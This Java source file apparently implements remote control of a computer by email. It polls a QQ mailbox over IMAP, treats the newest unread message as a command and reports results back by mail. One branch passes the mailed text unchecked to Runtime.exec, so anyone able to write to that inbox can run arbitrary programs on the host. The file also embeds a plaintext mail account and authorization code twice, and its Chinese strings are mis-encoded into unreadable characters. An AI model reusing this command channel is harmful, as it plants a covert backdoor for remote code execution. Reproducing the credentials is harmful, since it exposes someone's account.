package test;

import java.io.*;

import javax.mail.*;
import javax.mail.internet.*;
import javax.mail.internet.MimeMessage.RecipientType;

import java.util.Properties;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;

public class Main {
	public static void main(String[] args)
			throws AddressException, MessagingException, IOException, InterruptedException {

		
		SendMail s = new SendMail();
		// System.out.println(s.send("һ���ʼ�", "��������"));
		FetchMail f = new FetchMail();
		while (true) {
			String r = f.read();
			translateMsg(r, s);
			Thread.sleep(5000);
		}
	}

	// ����ָ��
	public static void translateMsg(String cmd, SendMail s) {
		if (cmd == null)
			return;
		String[] m = cmd.split(" ");
		do {
			System.out.print("�յ�" + m[0] + "ָ�");
			if (cmd.startsWith("���")) {
				System.out.println(cmd.substring(3));
				s.send("ִ�����ָ��", "�ɹ�", s.defaultTo);
				break;
			} else if (m.length >= 2) {
				if (m[0].equalsIgnoreCase("����")) {
					if (m[1].equalsIgnoreCase("������")) {
						System.out.println("����������");
						Runtime run = Runtime.getRuntime();
						try {
							run.exec("calc.exe");
						} catch (IOException e) {
							e.printStackTrace();
						}
						s.send("ִ������������ָ��", "�ɹ�", s.defaultTo);
						break;
					} else {
						System.out.println("����Ӧ�ó���");
						Runtime run = Runtime.getRuntime();
						try {
							run.exec(cmd.substring(3));
						} catch (IOException e) {
							e.printStackTrace();
						}
						break;
					}
				} else if (m.length>3&&m[0].equalsIgnoreCase("�����ʼ�")) {
					System.out.println("�����ʼ�");
					s.send(m[2], m[3], m[1]);
					s.send("ִ�з����ʼ�ָ��", "�ɹ�", s.defaultTo);
				}
			} else {
				System.out.println("��Чָ��");
			}
		} while (false);
	}
}

class SendMail {
	Properties properties;
	// �õ��ػ�����
	Session session;
	// ��ȡ�ʼ�����
	Message message;

	String defaultTo = "838826997@qq.com";

	public void Init() throws AddressException, MessagingException {
		properties = new Properties();
		properties.put("mail.transport.protocol", "smtp");// ����Э��
		properties.put("mail.smtp.host", "smtp.qq.com");// ������
		properties.put("mail.smtp.port", 465);// �˿ں�
		properties.put("mail.smtp.auth", "true");
		properties.put("mail.smtp.ssl.enable", "true");// �����Ƿ�ʹ��ssl��ȫ����//
														// ---һ�㶼ʹ��

		// �����Ƿ���ʾdebug��Ϣ true// ���ڿ���̨��ʾ�����Ϣ
		properties.put("mail.debug", "false");

		// �õ��ػ�����
		session = Session.getInstance(properties);

		// ��ȡ�ʼ�����
		message = new MimeMessage(session);
		// ���÷����������ַ
		message.setFrom(new InternetAddress("2493988448@qq.com"));

	}

	public SendMail() throws AddressException, MessagingException {
		Init();
	}

	public boolean send(String subject, String content, String to) {
		try {
			// �����ռ��˵�ַ
			message.setRecipients(RecipientType.TO, new InternetAddress[] { new InternetAddress(to) });
			// �����ʼ�����
			message.setSubject(subject);
			// �����ʼ�����
			message.setText(content);
			// �õ��ʲ����
			Transport transport = session.getTransport();
			// �����Լ��������˻�

			transport.connect("2493988448@qq.com", "lmwfdxvpwrtjdjag");

			// ����Ϊ�ղŵõ�����Ȩ�� // �����ʼ�
			transport.sendMessage(message, message.getAllRecipients());
			return true;
		} catch (MessagingException e) {
			// e.printStackTrace();
			return false;
		}

	}
}

class FetchMail {
	String protocol;
	boolean isSSL;
	String host;
	int port;
	String username;
	String password;

	Properties props;

	Session session;

	Store store;
	Folder folder;

	public void Init() {
		protocol = "imap";
		isSSL = true;
		host = "imap.qq.com";
		port = 993;
		username = "2493988448@qq.com";
		password = "lmwfdxvpwrtjdjag";

		props = new Properties();
		props.put("mail.imap.ssl.enable", isSSL);
		props.put("mail.imap.host", host);
		props.put("mail.imap.port", port);
		Authenticator auth = new Authenticator() {
			@Override
			protected PasswordAuthentication getPasswordAuthentication() {
			return new PasswordAuthentication(username, password);
			}
			};

		session = Session.getDefaultInstance(props,auth);

		store = null;
		folder = null;
	}

	public FetchMail() throws IOException, InterruptedException {
		Init();
	}

	public String read() throws IOException, InterruptedException {

		try {
			store = session.getStore(protocol);
			store.connect();

			folder = store.getFolder("INBOX");
 
			folder.open(Folder.READ_ONLY);

			int size = folder.getMessageCount();
			Message message = folder.getMessage(size);

			// �����ʼ�
			if (message.isSet(Flags.Flag.SEEN) == false) {
				message.setFlag(Flags.Flag.SEEN, true);
				return (String) ((MimeMultipart) message.getContent()).getBodyPart(0).getContent();
			} else {
				return null;
			}

		} catch (Exception e1) {
			return read();

		} finally {
			/*
			try {
				if (folder != null) {
					folder.close(false);
				}
				if (store != null) {
					store.close();
				}
			} catch (MessagingException e11) {
				e11.printStackTrace();
			}
			*/
		}

	}

}
